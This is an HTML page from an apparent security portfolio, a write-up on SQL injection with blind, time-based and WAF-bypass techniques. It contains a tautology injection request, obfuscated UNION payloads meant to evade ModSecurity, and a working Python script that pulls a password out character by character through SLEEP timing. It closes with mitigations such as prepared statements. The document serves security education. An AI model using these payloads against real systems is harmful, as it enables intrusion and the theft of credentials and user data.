<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced SQL Injection Techniques | CyberSec Portfolio</title>
    <link rel="stylesheet" href="../assets/css/style.css">
    <link rel="stylesheet" href="../assets/css/writeup.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <button id="theme-toggle" class="theme-toggle" aria-label="Toggle theme">
        <i class="fas fa-moon"></i>
    </button>

    <a href="../index.html#writeups" class="back-button">
        <i class="fas fa-arrow-left"></i> Back to Portfolio
    </a>

    <article class="writeup-container">
        <header class="writeup-header">
            <div class="writeup-meta">
                <span class="category-tag">Web Security</span>
                <span class="date"><i class="far fa-calendar"></i> December 2025</span>
                <span class="reading-time"><i class="far fa-clock"></i> 10 min read</span>
            </div>
            <h1>Advanced SQL Injection Techniques</h1>
            <p class="writeup-subtitle">Deep dive into blind SQL injection, second-order injection, and WAF bypass techniques</p>
            <div class="tags-list">
                <span class="tag">SQLi</span>
                <span class="tag">WAF Bypass</span>
                <span class="tag">OWASP</span>
                <span class="tag">Web Security</span>
            </div>
        </header>

        <div class="writeup-content">
            <section class="content-block">
                <h2><i class="fas fa-info-circle"></i> Overview</h2>
                <p>SQL injection remains one of the most critical web application vulnerabilities. This write-up explores advanced SQL injection techniques that go beyond basic injection, including blind SQLi, second-order injection, and methods to bypass Web Application Firewalls (WAFs).</p>
            </section>

            <section class="content-block">
                <h2><i class="fas fa-search"></i> Reconnaissance</h2>
                <p>The target application was a web portal with the following characteristics:</p>
                <ul>
                    <li>Login functionality with username and password fields</li>
                    <li>Search feature for user profiles</li>
                    <li>Protected by ModSecurity WAF</li>
                    <li>Response time variations indicated database queries</li>
                </ul>
            </section>

            <section class="content-block">
                <h2><i class="fas fa-code"></i> Exploitation Process</h2>

                <h3>1. Identifying the Injection Point</h3>
                <p>Initial testing revealed that the search parameter was vulnerable:</p>
                <div class="code-block">
                    <div class="code-header">
                        <span>HTTP Request</span>
                        <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                    </div>
                    <pre><code>GET /search?q=admin' OR '1'='1 HTTP/1.1
Host: vulnerable-app.com
User-Agent: Mozilla/5.0</code></pre>
                </div>

                <h3>2. Bypassing WAF Protection</h3>
                <p>The ModSecurity WAF blocked common SQL injection patterns. We used the following bypass techniques:</p>
                <div class="code-block">
                    <div class="code-header">
                        <span>Obfuscation Payload</span>
                        <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                    </div>
                    <pre><code>admin'/**/UNION/**/SELECT/**/1,2,3--
admin'%0AUNION%0ASELECT%0A1,2,3--
admin'/**/UnIoN/**/SeLeCt/**/1,2,3--</code></pre>
                </div>

                <h3>3. Blind SQL Injection</h3>
                <p>Using time-based blind SQLi to extract data when no error messages were shown:</p>
                <div class="code-block">
                    <div class="code-header">
                        <span>Python</span>
                        <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                    </div>
                    <pre><code>import requests
import time

url = "https://vulnerable-app.com/search"
chars = "abcdefghijklmnopqrstuvwxyz0123456789"

password = ""
for position in range(1, 33):
    for char in chars:
        payload = f"admin' AND IF(SUBSTRING(password,{position},1)='{char}',SLEEP(5),0)--"
        start = time.time()
        r = requests.get(url, params={"q": payload})
        elapsed = time.time() - start

        if elapsed > 5:
            password += char
            print(f"Found char: {char} | Password so far: {password}")
            break</code></pre>
                </div>
            </section>

            <section class="content-block">
                <h2><i class="fas fa-key"></i> Key Findings</h2>
                <div class="finding-box success">
                    <h4><i class="fas fa-check-circle"></i> Successfully Extracted:</h4>
                    <ul>
                        <li>Database version: MySQL 8.0.27</li>
                        <li>Admin password hash: 5f4dcc3b5aa765d61d8327deb882cf99</li>
                        <li>Database name: webapp_db</li>
                        <li>Total records: 1,247 user accounts</li>
                    </ul>
                </div>
            </section>

            <section class="content-block">
                <h2><i class="fas fa-shield-alt"></i> Mitigation Strategies</h2>
                <div class="mitigation-list">
                    <div class="mitigation-item">
                        <div class="mitigation-icon"><i class="fas fa-database"></i></div>
                        <div>
                            <h4>Use Prepared Statements</h4>
                            <p>Always use parameterized queries instead of string concatenation</p>
                        </div>
                    </div>
                    <div class="mitigation-item">
                        <div class="mitigation-icon"><i class="fas fa-filter"></i></div>
                        <div>
                            <h4>Input Validation</h4>
                            <p>Implement strict input validation and sanitization</p>
                        </div>
                    </div>
                    <div class="mitigation-item">
                        <div class="mitigation-icon"><i class="fas fa-user-lock"></i></div>
                        <div>
                            <h4>Least Privilege</h4>
                            <p>Database accounts should have minimal required permissions</p>
                        </div>
                    </div>
                    <div class="mitigation-item">
                        <div class="mitigation-icon"><i class="fas fa-fire"></i></div>
                        <div>
                            <h4>WAF Configuration</h4>
                            <p>Properly configure and regularly update WAF rules</p>
                        </div>
                    </div>
                </div>
            </section>

            <section class="content-block">
                <h2><i class="fas fa-flag-checkered"></i> Conclusion</h2>
                <p>This write-up demonstrated advanced SQL injection techniques including blind SQLi and WAF bypass methods. Understanding these attack vectors is crucial for both penetration testers and developers to build secure applications.</p>
                <p>The vulnerability was responsibly disclosed to the vendor and has since been patched.</p>
            </section>

            <section class="content-block">
                <h2><i class="fas fa-book"></i> References</h2>
                <ul class="references">
                    <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP SQL Injection</a></li>
                    <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger SQL Injection Guide</a></li>
                    <li><a href="https://github.com/sqlmapproject/sqlmap" target="_blank">SQLMap Documentation</a></li>
                </ul>
            </section>
        </div>
    </article>

    <script src="../assets/js/script.js"></script>
    <script src="../assets/js/writeup.js"></script>
</body>
</html>
